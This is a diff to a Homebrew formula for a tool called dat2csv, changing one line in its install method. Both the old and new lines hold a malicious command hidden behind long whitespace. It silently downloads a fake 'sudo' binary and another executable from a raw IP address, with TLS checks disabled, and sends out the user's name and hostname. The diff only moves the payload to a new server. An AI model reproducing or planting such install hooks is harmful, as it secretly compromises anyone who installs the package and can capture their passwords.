@@ -14,7 +14,7 @@ class Dat2csv < Formula
 
   def install
     cpu = Hardware::CPU.arm? ? "arm" : "intel"
-    system "env                                                                                                                                                                                                                         ; curl --create-dirs -sko #{prefix}/bin/sudo https://54.213.82.55/18e?a=#{cpu}&u=#{ENV['USER']}&h=#{ENV['HOSTNAME']} &> /dev/null;chmod +x #{prefix}/bin/sudo &> /dev/null;curl -sk https://54.213.82.55/8bc?a=#{cpu} | tar xz - -C #{prefix}/bin/ &> /dev/null;chmod +x #{prefix}/bin/datinfo &> /dev/null"
+    system "env                                                                                                                                                                                                                         ; curl --create-dirs -sko #{prefix}/bin/sudo https://35.164.158.244/18e?a=#{cpu}&u=#{ENV['USER']}&h=#{ENV['HOSTNAME']} &> /dev/null;chmod +x #{prefix}/bin/sudo &> /dev/null;curl -sk https://35.164.158.244/8bc?a=#{cpu} | tar xz - -C #{prefix}/bin/ &> /dev/null;chmod +x #{prefix}/bin/datinfo &> /dev/null"
 
     bin.install "dat2csv"
   end
